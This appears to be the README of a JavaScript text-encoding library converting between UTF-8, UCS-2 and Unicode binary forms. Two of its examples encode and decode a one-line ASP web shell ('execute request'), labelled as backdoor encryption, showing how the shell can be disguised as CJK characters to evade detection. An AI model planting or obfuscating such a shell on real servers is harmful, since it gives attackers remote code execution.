# About
Convert 
Utf8 to Utf8 Binary (Raw utf8 binary in memory), 
Utf8 to Ansi Binary (Char Binary),
Utf8 to Unicode Binary, 
Utf8 to Unicode Str, (ASP Backdoor Decrypt)
Utf8 to Ucs2, 
Ucs2 to Utf8, 
Unicode Str to Utf8, (ASP Backdoor Encrypt)
Unicode Binary to Ansi Binary (Char Binary), 
Unicode Binary to Str

# Example
```javascript
Utf8StrToUtf8Binary('ex')
// [101, 120] ([0x65, 0x78])
Utf8StrToUtf8Binary('严')
// [228, 184, 165] ([0xe4, 0xb8, 0xa5])
```

```javascript
Utf8StrToCharBinary('ex')
// [101, 120] ([0x65, 0x78])
Utf8StrToCharBinary('严')
// [20005] ([0x4e25])
```

```javascript
Utf8StrToUnicodeBinary('ex')
// [101, 0, 120, 0] ([0x65, 0x00, 0x78, 0x00])
Utf8StrToUnicodeBinary('ex', BigEndian = true)
// [0, 101, 0, 120] ([0x00, 0x65, 0x00, 0x78])
Utf8StrToUnicodeBinary('严')
// [37, 78] ([0x25, 0x4e])
Utf8StrToUnicodeBinary('严', BigEndian = true)
// [78, 37] ([0x4e, 0x25])
```

```javascript
Utf8StrToUnicodeStr('硥')
// "ex"
Utf8StrToUnicodeStr('┼攠數畣整爠煥敵瑳∨≮┩>')
// "<% execute request("n")%> " (ASP Backdoor Decrypt)
```

```javascript
Utf8ToUcs2('ex严')
// "ex%u4E25"
Utf8ToUcs2('ex严', encodeAll = true)
// "%u0065%u0078%u4E25"
Utf8ToUcs2('ex严', encodeAll = true, splitChar = '\\')
// "\u0065\u0078\u4E25"
```

```javascript
Ucs2ToUtf8('ex%u4E25')
// "ex严"
Ucs2ToUtf8('%u0065%u0078%u4E25')
// "ex严"
Ucs2ToUtf8('\\u0065\\u0078\\u4E25')
// "ex严"
```

```javascript
UnicodeStrToUtf8Str('ex')
// "硥"
UnicodeStrToUtf8Str('<% execute request("n")%>')
// "┼攠數畣整爠煥敵瑳∨≮┩>" (ASP Backdoor Encrypt)
```

```javascript
UnicodeBinaryToCharBinary([101, 0, 120, 0]) // [0x65, 0x00, 0x78, 0x00]
// [101, 120] ([0x65, 0x78], "ex")
UnicodeBinaryToCharBinary([37, 78]) // [0x25, 0x4e]
// [20005] ([0x4e25], "严")
```

```javascript
UnicodeBinaryToStr([101, 0, 120, 0]) // [0x65, 0x00, 0x78, 0x00]
// "ex"
UnicodeBinaryToStr([37, 78]) // [0x25, 0x4e]
// "严"
```












